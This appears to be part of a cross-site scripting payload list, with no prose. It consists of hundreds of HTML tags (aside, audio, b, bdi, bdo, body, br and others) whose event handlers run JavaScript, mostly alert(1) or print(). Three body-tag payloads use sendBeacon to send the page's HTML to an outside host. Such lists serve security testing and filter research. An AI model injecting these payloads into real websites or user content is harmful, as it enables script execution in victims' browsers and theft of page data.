<aside oncontextmenu="alert(1)" style=display:block>test</aside>
<aside oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<aside oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<aside ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</aside>
<aside onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</aside><input value=clickme>
<aside onkeydown="alert(1)" contenteditable style=display:block>test</aside>
<aside onkeypress="alert(1)" contenteditable style=display:block>test</aside>
<aside onkeyup="alert(1)" contenteditable style=display:block>test</aside>
<aside onmousedown="alert(1)" style=display:block>test</aside>
<aside onmouseenter="alert(1)" style=display:block>test</aside>
<aside onmouseleave="alert(1)" style=display:block>test</aside>
<aside onmousemove="alert(1)" style=display:block>test</aside>
<aside onmouseout="alert(1)" style=display:block>test</aside>
<aside onmouseover="alert(1)" style=display:block>test</aside>
<aside onmouseup="alert(1)" style=display:block>test</aside>
<aside onmousewheel=alert(1) style=display:block>requires scrolling
<aside onpaste="alert(1)" contenteditable>test</aside>
<aside onpointerdown=alert(1) style=display:block>XSS</aside>
<aside onpointerenter=alert(1) style=display:block>XSS</aside>
<aside onpointerleave=alert(1) style=display:block>XSS</aside>
<aside onpointermove=alert(1) style=display:block>XSS</aside>
<aside onpointerout=alert(1) style=display:block>XSS</aside>
<aside onpointerover=alert(1) style=display:block>XSS</aside>
<aside onpointerrawupdate=alert(1) style=display:block>XSS</aside>
<aside onpointerup=alert(1) style=display:block>XSS</aside>
<aside onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></aside>
<audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>
<audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<audio contenteditable onbeforeinput=alert(1)>test
<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<audio controls autoplay onratechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
<audio controls src=1 onfocus=alert(1) autofocus>
<audio controls src=1 onfocusin=alert(1) autofocus>
<audio draggable="true" ondrag="alert(1)" style=display:block>test</audio>
<audio draggable="true" ondragend="alert(1)" style=display:block>test</audio>
<audio draggable="true" ondragenter="alert(1)" style=display:block>test</audio>
<audio draggable="true" ondragleave="alert(1)" style=display:block>test</audio>
<audio draggable="true" ondragstart="alert(1)" style=display:block>test</audio>
<audio id=x controls onfocus=alert(1) id=x><source src="validaudio.wav"></audio>
<audio id=x controls onfocusin=alert(1) id=x><source src="validaudio.wav"></audio>
<audio id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></audio>
<audio onafterscriptexecute=alert(1)><script>1</script>
<audio onbeforecopy="alert(1)" contenteditable>test</audio>
<audio onbeforecut="alert(1)" contenteditable>test</audio>
<audio onbeforescriptexecute=alert(1)><script>1</script>
<audio onblur=alert(1) id=x tabindex=1 style=display:block>test</audio><input value=clickme>
<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<audio onclick="alert(1)" style=display:block>test</audio>
<audio oncontextmenu="alert(1)" style=display:block>test</audio>
<audio oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<audio oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<audio ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</audio>
<audio onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</audio><input value=clickme>
<audio onkeydown="alert(1)" contenteditable style=display:block>test</audio>
<audio onkeypress="alert(1)" contenteditable style=display:block>test</audio>
<audio onkeyup="alert(1)" contenteditable style=display:block>test</audio>
<audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<audio onmousedown="alert(1)" style=display:block>test</audio>
<audio onmouseenter="alert(1)" style=display:block>test</audio>
<audio onmouseleave="alert(1)" style=display:block>test</audio>
<audio onmousemove="alert(1)" style=display:block>test</audio>
<audio onmouseout="alert(1)" style=display:block>test</audio>
<audio onmouseover="alert(1)" style=display:block>test</audio>
<audio onmouseup="alert(1)" style=display:block>test</audio>
<audio onmousewheel=alert(1) style=display:block>requires scrolling
<audio onpaste="alert(1)" contenteditable>test</audio>
<audio onpointerdown=alert(1) style=display:block>XSS</audio>
<audio onpointerenter=alert(1) style=display:block>XSS</audio>
<audio onpointerleave=alert(1) style=display:block>XSS</audio>
<audio onpointermove=alert(1) style=display:block>XSS</audio>
<audio onpointerout=alert(1) style=display:block>XSS</audio>
<audio onpointerover=alert(1) style=display:block>XSS</audio>
<audio onpointerrawupdate=alert(1) style=display:block>XSS</audio>
<audio onpointerup=alert(1) style=display:block>XSS</audio>
<audio onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></audio>
<audio src/onerror=alert(1)>
<audio2 contenteditable onbeforeinput=alert(1)>test
<audio2 draggable="true" ondrag="alert(1)" style=display:block>test</audio2>
<audio2 draggable="true" ondragend="alert(1)" style=display:block>test</audio2>
<audio2 draggable="true" ondragenter="alert(1)" style=display:block>test</audio2>
<audio2 draggable="true" ondragleave="alert(1)" style=display:block>test</audio2>
<audio2 draggable="true" ondragstart="alert(1)" style=display:block>test</audio2>
<audio2 id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></audio2>
<audio2 onafterscriptexecute=alert(1)><script>1</script>
<audio2 onbeforescriptexecute=alert(1)><script>1</script>
<audio2 onblur=alert(1) id=x tabindex=1 style=display:block>test</audio2><input value=clickme>
<audio2 onclick="alert(1)" style=display:block>test</audio2>
<audio2 oncontextmenu="alert(1)" style=display:block>test</audio2>
<audio2 oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<audio2 oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<audio2 ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</audio2>
<audio2 onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</audio2><input value=clickme>
<audio2 onkeydown="alert(1)" contenteditable style=display:block>test</audio2>
<audio2 onkeypress="alert(1)" contenteditable style=display:block>test</audio2>
<audio2 onkeyup="alert(1)" contenteditable style=display:block>test</audio2>
<audio2 onmousedown="alert(1)" style=display:block>test</audio2>
<audio2 onmouseenter="alert(1)" style=display:block>test</audio2>
<audio2 onmouseleave="alert(1)" style=display:block>test</audio2>
<audio2 onmousemove="alert(1)" style=display:block>test</audio2>
<audio2 onmouseout="alert(1)" style=display:block>test</audio2>
<audio2 onmouseover="alert(1)" style=display:block>test</audio2>
<audio2 onmouseup="alert(1)" style=display:block>test</audio2>
<audio2 onmousewheel=alert(1) style=display:block>requires scrolling
<audio2 onpointerdown=alert(1) style=display:block>XSS</audio2>
<audio2 onpointerenter=alert(1) style=display:block>XSS</audio2>
<audio2 onpointerleave=alert(1) style=display:block>XSS</audio2>
<audio2 onpointermove=alert(1) style=display:block>XSS</audio2>
<audio2 onpointerout=alert(1) style=display:block>XSS</audio2>
<audio2 onpointerover=alert(1) style=display:block>XSS</audio2>
<audio2 onpointerrawupdate=alert(1) style=display:block>XSS</audio2>
<audio2 onpointerup=alert(1) style=display:block>XSS</audio2>
<audio2 onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></audio2>
<b contenteditable onbeforeinput=alert(1)>test
<b draggable="true" ondrag="alert(1)" style=display:block>test</b>
<b draggable="true" ondragend="alert(1)" style=display:block>test</b>
<b draggable="true" ondragenter="alert(1)" style=display:block>test</b>
<b draggable="true" ondragleave="alert(1)" style=display:block>test</b>
<b draggable="true" ondragstart="alert(1)" style=display:block>test</b>
<b id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></b>
<b id=x tabindex=1 onfocus=alert(1)></b>
<b id=x tabindex=1 onfocusin=alert(1)></b>
<b onafterscriptexecute=alert(1)><script>1</script>
<b onbeforecopy="alert(1)" contenteditable>test</b>
<b onbeforecut="alert(1)" contenteditable>test</b>
<b onbeforescriptexecute=alert(1)><script>1</script>
<b onblur=alert(1) id=x tabindex=1 style=display:block>test</b><input value=clickme>
<b onclick="alert(1)" style=display:block>test</b>
<b oncontextmenu="alert(1)" style=display:block>test</b>
<b oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<b oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<b ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</b>
<b onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</b><input value=clickme>
<b onkeydown="alert(1)" contenteditable style=display:block>test</b>
<b onkeypress="alert(1)" contenteditable style=display:block>test</b>
<b onkeyup="alert(1)" contenteditable style=display:block>test</b>
<b onmousedown="alert(1)" style=display:block>test</b>
<b onmouseenter="alert(1)" style=display:block>test</b>
<b onmouseleave="alert(1)" style=display:block>test</b>
<b onmousemove="alert(1)" style=display:block>test</b>
<b onmouseout="alert(1)" style=display:block>test</b>
<b onmouseover="alert(1)" style=display:block>test</b>
<b onmouseup="alert(1)" style=display:block>test</b>
<b onmousewheel=alert(1) style=display:block>requires scrolling
<b onpaste="alert(1)" contenteditable>test</b>
<b onpointerdown=alert(1) style=display:block>XSS</b>
<b onpointerenter=alert(1) style=display:block>XSS</b>
<b onpointerleave=alert(1) style=display:block>XSS</b>
<b onpointermove=alert(1) style=display:block>XSS</b>
<b onpointerout=alert(1) style=display:block>XSS</b>
<b onpointerover=alert(1) style=display:block>XSS</b>
<b onpointerrawupdate=alert(1) style=display:block>XSS</b>
<b onpointerup=alert(1) style=display:block>XSS</b>
<b onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></b>
<bdi contenteditable onbeforeinput=alert(1)>test
<bdi draggable="true" ondrag="alert(1)" style=display:block>test</bdi>
<bdi draggable="true" ondragend="alert(1)" style=display:block>test</bdi>
<bdi draggable="true" ondragenter="alert(1)" style=display:block>test</bdi>
<bdi draggable="true" ondragleave="alert(1)" style=display:block>test</bdi>
<bdi draggable="true" ondragstart="alert(1)" style=display:block>test</bdi>
<bdi id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></bdi>
<bdi id=x tabindex=1 onfocus=alert(1)></bdi>
<bdi id=x tabindex=1 onfocusin=alert(1)></bdi>
<bdi onafterscriptexecute=alert(1)><script>1</script>
<bdi onbeforecopy="alert(1)" contenteditable>test</bdi>
<bdi onbeforecut="alert(1)" contenteditable>test</bdi>
<bdi onbeforescriptexecute=alert(1)><script>1</script>
<bdi onblur=alert(1) id=x tabindex=1 style=display:block>test</bdi><input value=clickme>
<bdi onclick="alert(1)" style=display:block>test</bdi>
<bdi oncontextmenu="alert(1)" style=display:block>test</bdi>
<bdi oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<bdi oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<bdi ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</bdi>
<bdi onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</bdi><input value=clickme>
<bdi onkeydown="alert(1)" contenteditable style=display:block>test</bdi>
<bdi onkeypress="alert(1)" contenteditable style=display:block>test</bdi>
<bdi onkeyup="alert(1)" contenteditable style=display:block>test</bdi>
<bdi onmousedown="alert(1)" style=display:block>test</bdi>
<bdi onmouseenter="alert(1)" style=display:block>test</bdi>
<bdi onmouseleave="alert(1)" style=display:block>test</bdi>
<bdi onmousemove="alert(1)" style=display:block>test</bdi>
<bdi onmouseout="alert(1)" style=display:block>test</bdi>
<bdi onmouseover="alert(1)" style=display:block>test</bdi>
<bdi onmouseup="alert(1)" style=display:block>test</bdi>
<bdi onmousewheel=alert(1) style=display:block>requires scrolling
<bdi onpaste="alert(1)" contenteditable>test</bdi>
<bdi onpointerdown=alert(1) style=display:block>XSS</bdi>
<bdi onpointerenter=alert(1) style=display:block>XSS</bdi>
<bdi onpointerleave=alert(1) style=display:block>XSS</bdi>
<bdi onpointermove=alert(1) style=display:block>XSS</bdi>
<bdi onpointerout=alert(1) style=display:block>XSS</bdi>
<bdi onpointerover=alert(1) style=display:block>XSS</bdi>
<bdi onpointerrawupdate=alert(1) style=display:block>XSS</bdi>
<bdi onpointerup=alert(1) style=display:block>XSS</bdi>
<bdi onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></bdi>
<bdo contenteditable onbeforeinput=alert(1)>test
<bdo draggable="true" ondrag="alert(1)" style=display:block>test</bdo>
<bdo draggable="true" ondragend="alert(1)" style=display:block>test</bdo>
<bdo draggable="true" ondragenter="alert(1)" style=display:block>test</bdo>
<bdo draggable="true" ondragleave="alert(1)" style=display:block>test</bdo>
<bdo draggable="true" ondragstart="alert(1)" style=display:block>test</bdo>
<bdo id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></bdo>
<bdo id=x tabindex=1 onfocus=alert(1)></bdo>
<bdo id=x tabindex=1 onfocusin=alert(1)></bdo>
<bdo onafterscriptexecute=alert(1)><script>1</script>
<bdo onbeforecopy="alert(1)" contenteditable>test</bdo>
<bdo onbeforecut="alert(1)" contenteditable>test</bdo>
<bdo onbeforescriptexecute=alert(1)><script>1</script>
<bdo onblur=alert(1) id=x tabindex=1 style=display:block>test</bdo><input value=clickme>
<bdo onclick="alert(1)" style=display:block>test</bdo>
<bdo oncontextmenu="alert(1)" style=display:block>test</bdo>
<bdo oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<bdo oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<bdo ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</bdo>
<bdo onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</bdo><input value=clickme>
<bdo onkeydown="alert(1)" contenteditable style=display:block>test</bdo>
<bdo onkeypress="alert(1)" contenteditable style=display:block>test</bdo>
<bdo onkeyup="alert(1)" contenteditable style=display:block>test</bdo>
<bdo onmousedown="alert(1)" style=display:block>test</bdo>
<bdo onmouseenter="alert(1)" style=display:block>test</bdo>
<bdo onmouseleave="alert(1)" style=display:block>test</bdo>
<bdo onmousemove="alert(1)" style=display:block>test</bdo>
<bdo onmouseout="alert(1)" style=display:block>test</bdo>
<bdo onmouseover="alert(1)" style=display:block>test</bdo>
<bdo onmouseup="alert(1)" style=display:block>test</bdo>
<bdo onmousewheel=alert(1) style=display:block>requires scrolling
<bdo onpaste="alert(1)" contenteditable>test</bdo>
<bdo onpointerdown=alert(1) style=display:block>XSS</bdo>
<bdo onpointerenter=alert(1) style=display:block>XSS</bdo>
<bdo onpointerleave=alert(1) style=display:block>XSS</bdo>
<bdo onpointermove=alert(1) style=display:block>XSS</bdo>
<bdo onpointerout=alert(1) style=display:block>XSS</bdo>
<bdo onpointerover=alert(1) style=display:block>XSS</bdo>
<bdo onpointerrawupdate=alert(1) style=display:block>XSS</bdo>
<bdo onpointerup=alert(1) style=display:block>XSS</bdo>
<bdo onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></bdo>
<big contenteditable onbeforeinput=alert(1)>test
<big draggable="true" ondrag="alert(1)" style=display:block>test</big>
<big draggable="true" ondragend="alert(1)" style=display:block>test</big>
<big draggable="true" ondragenter="alert(1)" style=display:block>test</big>
<big draggable="true" ondragleave="alert(1)" style=display:block>test</big>
<big draggable="true" ondragstart="alert(1)" style=display:block>test</big>
<big id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></big>
<big id=x tabindex=1 onfocus=alert(1)></big>
<big id=x tabindex=1 onfocusin=alert(1)></big>
<big onafterscriptexecute=alert(1)><script>1</script>
<big onbeforecopy="alert(1)" contenteditable>test</big>
<big onbeforecut="alert(1)" contenteditable>test</big>
<big onbeforescriptexecute=alert(1)><script>1</script>
<big onblur=alert(1) id=x tabindex=1 style=display:block>test</big><input value=clickme>
<big onclick="alert(1)" style=display:block>test</big>
<big oncontextmenu="alert(1)" style=display:block>test</big>
<big oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<big oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<big ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</big>
<big onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</big><input value=clickme>
<big onkeydown="alert(1)" contenteditable style=display:block>test</big>
<big onkeypress="alert(1)" contenteditable style=display:block>test</big>
<big onkeyup="alert(1)" contenteditable style=display:block>test</big>
<big onmousedown="alert(1)" style=display:block>test</big>
<big onmouseenter="alert(1)" style=display:block>test</big>
<big onmouseleave="alert(1)" style=display:block>test</big>
<big onmousemove="alert(1)" style=display:block>test</big>
<big onmouseout="alert(1)" style=display:block>test</big>
<big onmouseover="alert(1)" style=display:block>test</big>
<big onmouseup="alert(1)" style=display:block>test</big>
<big onmousewheel=alert(1) style=display:block>requires scrolling
<big onpaste="alert(1)" contenteditable>test</big>
<big onpointerdown=alert(1) style=display:block>XSS</big>
<big onpointerenter=alert(1) style=display:block>XSS</big>
<big onpointerleave=alert(1) style=display:block>XSS</big>
<big onpointermove=alert(1) style=display:block>XSS</big>
<big onpointerout=alert(1) style=display:block>XSS</big>
<big onpointerover=alert(1) style=display:block>XSS</big>
<big onpointerrawupdate=alert(1) style=display:block>XSS</big>
<big onpointerup=alert(1) style=display:block>XSS</big>
<big onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></big>
<blink contenteditable onbeforeinput=alert(1)>test
<blink draggable="true" ondrag="alert(1)" style=display:block>test</blink>
<blink draggable="true" ondragend="alert(1)" style=display:block>test</blink>
<blink draggable="true" ondragenter="alert(1)" style=display:block>test</blink>
<blink draggable="true" ondragleave="alert(1)" style=display:block>test</blink>
<blink draggable="true" ondragstart="alert(1)" style=display:block>test</blink>
<blink id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></blink>
<blink id=x tabindex=1 onfocus=alert(1)></blink>
<blink id=x tabindex=1 onfocusin=alert(1)></blink>
<blink onafterscriptexecute=alert(1)><script>1</script>
<blink onbeforecopy="alert(1)" contenteditable>test</blink>
<blink onbeforecut="alert(1)" contenteditable>test</blink>
<blink onbeforescriptexecute=alert(1)><script>1</script>
<blink onblur=alert(1) id=x tabindex=1 style=display:block>test</blink><input value=clickme>
<blink onclick="alert(1)" style=display:block>test</blink>
<blink oncontextmenu="alert(1)" style=display:block>test</blink>
<blink oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<blink oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<blink ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</blink>
<blink onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</blink><input value=clickme>
<blink onkeydown="alert(1)" contenteditable style=display:block>test</blink>
<blink onkeypress="alert(1)" contenteditable style=display:block>test</blink>
<blink onkeyup="alert(1)" contenteditable style=display:block>test</blink>
<blink onmousedown="alert(1)" style=display:block>test</blink>
<blink onmouseenter="alert(1)" style=display:block>test</blink>
<blink onmouseleave="alert(1)" style=display:block>test</blink>
<blink onmousemove="alert(1)" style=display:block>test</blink>
<blink onmouseout="alert(1)" style=display:block>test</blink>
<blink onmouseover="alert(1)" style=display:block>test</blink>
<blink onmouseup="alert(1)" style=display:block>test</blink>
<blink onmousewheel=alert(1) style=display:block>requires scrolling
<blink onpaste="alert(1)" contenteditable>test</blink>
<blink onpointerdown=alert(1) style=display:block>XSS</blink>
<blink onpointerenter=alert(1) style=display:block>XSS</blink>
<blink onpointerleave=alert(1) style=display:block>XSS</blink>
<blink onpointermove=alert(1) style=display:block>XSS</blink>
<blink onpointerout=alert(1) style=display:block>XSS</blink>
<blink onpointerover=alert(1) style=display:block>XSS</blink>
<blink onpointerrawupdate=alert(1) style=display:block>XSS</blink>
<blink onpointerup=alert(1) style=display:block>XSS</blink>
<blink onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></blink>
<blockquote contenteditable onbeforeinput=alert(1)>test
<blockquote draggable="true" ondrag="alert(1)" style=display:block>test</blockquote>
<blockquote draggable="true" ondragend="alert(1)" style=display:block>test</blockquote>
<blockquote draggable="true" ondragenter="alert(1)" style=display:block>test</blockquote>
<blockquote draggable="true" ondragleave="alert(1)" style=display:block>test</blockquote>
<blockquote draggable="true" ondragstart="alert(1)" style=display:block>test</blockquote>
<blockquote id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></blockquote>
<blockquote id=x tabindex=1 onfocus=alert(1)></blockquote>
<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>
<blockquote onafterscriptexecute=alert(1)><script>1</script>
<blockquote onbeforecopy="alert(1)" contenteditable>test</blockquote>
<blockquote onbeforecut="alert(1)" contenteditable>test</blockquote>
<blockquote onbeforescriptexecute=alert(1)><script>1</script>
<blockquote onblur=alert(1) id=x tabindex=1 style=display:block>test</blockquote><input value=clickme>
<blockquote onclick="alert(1)" style=display:block>test</blockquote>
<blockquote oncontextmenu="alert(1)" style=display:block>test</blockquote>
<blockquote oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<blockquote oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<blockquote ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</blockquote>
<blockquote onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</blockquote><input value=clickme>
<blockquote onkeydown="alert(1)" contenteditable style=display:block>test</blockquote>
<blockquote onkeypress="alert(1)" contenteditable style=display:block>test</blockquote>
<blockquote onkeyup="alert(1)" contenteditable style=display:block>test</blockquote>
<blockquote onmousedown="alert(1)" style=display:block>test</blockquote>
<blockquote onmouseenter="alert(1)" style=display:block>test</blockquote>
<blockquote onmouseleave="alert(1)" style=display:block>test</blockquote>
<blockquote onmousemove="alert(1)" style=display:block>test</blockquote>
<blockquote onmouseout="alert(1)" style=display:block>test</blockquote>
<blockquote onmouseover="alert(1)" style=display:block>test</blockquote>
<blockquote onmouseup="alert(1)" style=display:block>test</blockquote>
<blockquote onmousewheel=alert(1) style=display:block>requires scrolling
<blockquote onpaste="alert(1)" contenteditable>test</blockquote>
<blockquote onpointerdown=alert(1) style=display:block>XSS</blockquote>
<blockquote onpointerenter=alert(1) style=display:block>XSS</blockquote>
<blockquote onpointerleave=alert(1) style=display:block>XSS</blockquote>
<blockquote onpointermove=alert(1) style=display:block>XSS</blockquote>
<blockquote onpointerout=alert(1) style=display:block>XSS</blockquote>
<blockquote onpointerover=alert(1) style=display:block>XSS</blockquote>
<blockquote onpointerrawupdate=alert(1) style=display:block>XSS</blockquote>
<blockquote onpointerup=alert(1) style=display:block>XSS</blockquote>
<blockquote onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></blockquote>
<body contenteditable onbeforeinput=alert(1)>test
<body draggable="true" ondrag="alert(1)" style=display:block>test</body>
<body draggable="true" ondragend="alert(1)" style=display:block>test</body>
<body draggable="true" ondragenter="alert(1)" style=display:block>test</body>
<body draggable="true" ondragleave="alert(1)" style=display:block>test</body>
<body draggable="true" ondragstart="alert(1)" style=display:block>test</body>
<body id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></body>
<body id=x tabindex=1 onfocus=alert(1)></body>
<body id=x tabindex=1 onfocusin=alert(1)></body>
<body onafterprint=alert(1)>
<body onafterscriptexecute=alert(1)><script>1</script>
<body onbeforecopy="alert(1)" contenteditable>test</body>
<body onbeforecut="alert(1)" contenteditable>test</body>
<body onbeforeprint=console.log(1)>
<body onbeforescriptexecute=alert(1)><script>1</script>
<body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
<body onblur=alert(1) id=x tabindex=1 style=display:block>test</body><input value=clickme>
<body onclick="alert(1)" style=display:block>test</body>
<body oncontextmenu="alert(1)" style=display:block>test</body>
<body oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<body oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<body ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</body>
<body onerror=alert(1) onload=/>
<body onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</body><input value=clickme>
<body onhashchange="print()">
<body onkeydown="alert(1)" contenteditable style=display:block>test</body>
<body onkeypress="alert(1)" contenteditable style=display:block>test</body>
<body onkeyup="alert(1)" contenteditable style=display:block>test</body>
<body onload=alert(1)>
<body onmessage=print()>
<body onmousedown="alert(1)" style=display:block>test</body>
<body onmouseenter="alert(1)" style=display:block>test</body>
<body onmouseleave="alert(1)" style=display:block>test</body>
<body onmousemove="alert(1)" style=display:block>test</body>
<body onmouseout="alert(1)" style=display:block>test</body>
<body onmouseover="alert(1)" style=display:block>test</body>
<body onmouseup="alert(1)" style=display:block>test</body>
<body onmousewheel=alert(1) style=display:block>requires scrolling
<body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
<body onpageshow=alert(1)>
<body onpaste="alert(1)" contenteditable>test</body>
<body onpointerdown=alert(1) style=display:block>XSS</body>
<body onpointerenter=alert(1) style=display:block>XSS</body>
<body onpointerleave=alert(1) style=display:block>XSS</body>
<body onpointermove=alert(1) style=display:block>XSS</body>
<body onpointerout=alert(1) style=display:block>XSS</body>
<body onpointerover=alert(1) style=display:block>XSS</body>
<body onpointerrawupdate=alert(1) style=display:block>XSS</body>
<body onpointerup=alert(1) style=display:block>XSS</body>
<body onpopstate=print()>
<body onresize="print()">
<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>
<body onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></body>
<body onselectionchange=alert(1)>select some text
<body onselectstart=alert(1)>select some text
<body ontouchend=alert(1)> 
<body ontouchmove=alert(1)> 
<body ontouchstart=alert(1)> 
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>
<body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
<body onwheel=alert(1)>
<br contenteditable onbeforeinput=alert(1)>test
<br draggable="true" ondrag="alert(1)" style=display:block>test</br>
<br draggable="true" ondragend="alert(1)" style=display:block>test</br>
<br draggable="true" ondragenter="alert(1)" style=display:block>test</br>
<br draggable="true" ondragleave="alert(1)" style=display:block>test</br>
<br draggable="true" ondragstart="alert(1)" style=display:block>test</br>
<br id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></br>
<br id=x tabindex=1 onfocus=alert(1)></br>
<br id=x tabindex=1 onfocusin=alert(1)></br>
<br onafterscriptexecute=alert(1)><script>1</script>
<br onbeforecopy="alert(1)" contenteditable>test</br>
<br onbeforecut="alert(1)" contenteditable>test</br>
<br onbeforescriptexecute=alert(1)><script>1</script>
<br onblur=alert(1) id=x tabindex=1 style=display:block>test</br><input value=clickme>
<br onclick="alert(1)" style=display:block>test</br>
<br oncontextmenu="alert(1)" style=display:block>test</br>
<br oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<br oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<br ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</br>
<br onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</br><input value=clickme>
<br onkeydown="alert(1)" contenteditable style=display:block>test</br>
<br onkeypress="alert(1)" contenteditable style=display:block>test</br>
<br onkeyup="alert(1)" contenteditable style=display:block>test</br>
<br onmousedown="alert(1)" style=display:block>test</br>
<br onmouseenter="alert(1)" style=display:block>test</br>
<br onmouseleave="alert(1)" style=display:block>test</br>
<br onmousemove="alert(1)" style=display:block>test</br>
<br onmouseout="alert(1)" style=display:block>test</br>
